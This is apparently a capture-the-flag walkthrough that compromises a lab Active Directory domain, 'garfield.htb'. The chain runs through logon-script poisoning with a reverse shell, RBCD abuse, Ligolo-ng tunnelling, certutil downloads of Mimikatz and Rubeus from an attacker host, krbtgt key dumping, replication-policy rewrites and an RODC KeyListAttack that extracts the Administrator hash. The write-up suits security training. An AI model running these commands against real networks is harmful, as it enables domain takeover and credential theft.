## Finding a Writable Attribute

Rather than clicking through the BloodHound GUI for every edge, `bloodyAD` can just list every object `j.arbuckle` has write access to directly.

```shell
bloodyAD --host DC01.garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable --detail

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
```

`j.arbuckle` can write Liz Wilson's `scriptPath` attribute, the logon script Windows runs for her at every logon. That's effectively arbitrary code execution as her, the moment she logs in next.

## Abusing the Logon Script for a Shell as l.wilson

The `printerDetect.bat` file found earlier is already sitting in the scripts share and already referenced by other accounts, which makes it a convenient target to poison rather than pointing at something new and suspicious.

Connecting to the share directly and editing the file in place:

```shell
smb://10.129.16.153/sysvol/garfield.htb/scripts
```

I replaced its contents with a base64-encoded PowerShell reverse shell one-liner from revshells.com, then pointed Liz Wilson's `scriptPath` at it.

```shell
bloodyAD --host DC01.garfield.htb -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
  set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat
```

With a listener running, the next time `l.wilson` logs on, the reverse shell fires as her.

## Mapping the Path to Root

With a proper WinRM foothold, BloodHound's picture of `l.wilson_adm` opens up considerably. Two edges stood out:

- `l.wilson_adm` can add herself to a Tier 1 group called `RODC Administrators` (an `AddSelf` privilege).
- That group, in turn, has `Trusted For Constrained Delegation` rights, and `l.wilson_adm` specifically holds `AccountRestrictions` over `RODC01`, an isolated Read-Only Domain Controller.

```shell
bloodyAD --host DC01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Test1234!' \
  add groupMember "RODC Administrators" l.wilson_adm
```

`RODC01` isn't reachable from the internet directly, but a quick `arp -a` from inside the current shell locates it on an internal segment.

```shell
arp -a

192.168.100.2   RODC01
```

## Abusing RBCD Against RODC01

`RODC01` trusting the `RODC Administrators` group for constrained delegation, combined with `l.wilson_adm`'s account restriction rights, opens the door to resource-based constrained delegation abuse: create a fake computer account, delegate from it to `RODC01`, then request a service ticket impersonating Administrator.

```shell
addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' \
  -dc-host DC01.garfield.htb -domain-netbios garfield.htb garfield.htb/l.wilson_adm:Test1234!
```

```shell
rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'RODC01$' -action 'write' \
  garfield.htb/l.wilson_adm:Test1234! -dc-host DC01.garfield.htb
```

```shell
getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate 'Administrator' \
  'garfield.htb/attackersystem$:Summer2018!' -dc-ip DC01.garfield.htb
```

That last command drops a `.ccache` file for the impersonated ticket in the current directory, `Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache`. Rather than exporting it globally, I just point individual commands at it as needed by prefixing them with `KRB5CCNAME`, which keeps it scoped to a single command instead of polluting the whole shell session.

```shell
KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache klist
```

A valid, impersonated CIFS ticket for Administrator against `RODC01`, but the network path to actually use it is still missing.

## Tunneling to the Isolated Network

`RODC01` sits on `192.168.100.0/24`, only reachable from `DC01` itself. Ligolo-ng bridges that gap by running an agent inside the existing WinRM session.

On my own attack box (`10.10.14.5` in this run):

```shell
sudo ./proxy -selfcert
```

Uploaded and run from the Evil-WinRM session on `DC01`:

```shell
upload agent.exe
.\agent.exe -connect 10.10.14.5:11601 -ignore-cert
```

With the tunnel active, `RODC01` becomes directly reachable.

```shell
echo "192.168.100.2 RODC01.garfield.htb" | tee -a /etc/hosts
```

## PsExec onto RODC01

With the earlier impersonated Kerberos ticket still sitting in its `.ccache` file, authenticating to `RODC01` needs no password at all.

```shell
KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache \
  psexec.py -k RODC01.garfield.htb -dc-ip 10.129.16.153
```

A shell as Administrator, but only locally on `RODC01`, since RODCs by design can't authenticate arbitrary domain accounts on their own.

## Dumping RODC01's krbtgt Key

Every Read-Only Domain Controller gets its own, unique krbtgt account, separate from the domain's shared one, numbered to match the RODC. Grabbed a copy of Mimikatz over a quick Python web server.

```shell
sudo python3 -m http.server 80
```

```shell
certutil -split -urlcache -f http://10.10.14.5/mimikatz.exe c:\Users\Administrator\Desktop\mimikatz.exe
```

```shell
.\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245"

aes256_hmac (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
```

`RODC01`'s own krbtgt key, `krbtgt_8245`. On its own, this key only lets tickets be forged that `RODC01` itself will accept, it isn't the domain's real krbtgt, so this alone doesn't hand over the domain.

## Rewriting RODC Replication Policy

RODCs cache passwords only for accounts explicitly allowed to replicate to them, and by design, high-value accounts are always excluded via `msDS-NeverRevealGroup`, regardless of anything else. Checking `RODC01`'s current policy:

```shell
bloodyAD --host DC01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Test1234!' \
  get object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" --attr msDS-NeverRevealGroup

msDS-NeverRevealGroup: CN=Denied RODC Password Replication Group..., CN=Account Operators..., CN=Server Operators...
```

With write access to `RODC01`'s object (inherited from the earlier `RODC Administrators` membership), that denial list can just be rewritten, dropping the group that would otherwise block Administrator from ever being cached.

```shell
bloodyAD --host DC01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Test1234!' \
  set object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" msDS-NeverRevealGroup \
  -v "CN=Account Operators,CN=Builtin,DC=garfield,DC=htb" \
  -v "CN=Server Operators,CN=Builtin,DC=garfield,DC=htb" \
  -v "CN=Backup Operators,CN=Builtin,DC=garfield,DC=htb"
```

And explicitly allow Administrator through the reveal list.

```shell
bloodyAD --host DC01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Test1234!' \
  set object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" msDS-RevealOnDemandGroup \
  -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' \
  -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
```

## The RODC KeyListAttack

This is the technique that ties everything together. A recent copy of Rubeus is required, since the KeyListAttack support is a newer addition.

```shell
certutil -split -urlcache -f http://10.10.14.5/rubeus.exe c:\Users\Administrator\Desktop\rubeus.exe
```

First, a golden ticket forged with `RODC01`'s own krbtgt key. This ticket is only trusted by `RODC01` itself, not the wider domain, but that's exactly what's needed here.

```shell
.\rubeus.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 \
  /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 \
  /outfile:'c:\ticket.kirbi' /nowrap
```

With that golden ticket in hand, requesting a service ticket using the `/keyList` flag triggers the actual attack. This flag asks the KDC to include a `KERB-KEY-LIST-REP` structure, a legacy mechanism originally meant to help RODCs learn a user's key when it's needed for replication. Since the replication policy now explicitly allows Administrator's credentials through, the KDC (validating the request against the real, writable domain) happily includes Administrator's real NT hash directly in the response.

```shell
.\rubeus.exe asktgs /enctype:aes256 /keyList \
  /ticket:'c:\ticket_2026_04_11_04_28_50_Administrator_to_krbtgt@GARFIELD.HTB.kirbi' \
  /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /nowrap
```

```shell
EE238F6DEBC752010428F20875B092D5
```

That's Administrator's genuine, domain-wide NTLM hash, extracted without ever touching NTDS.dit directly.
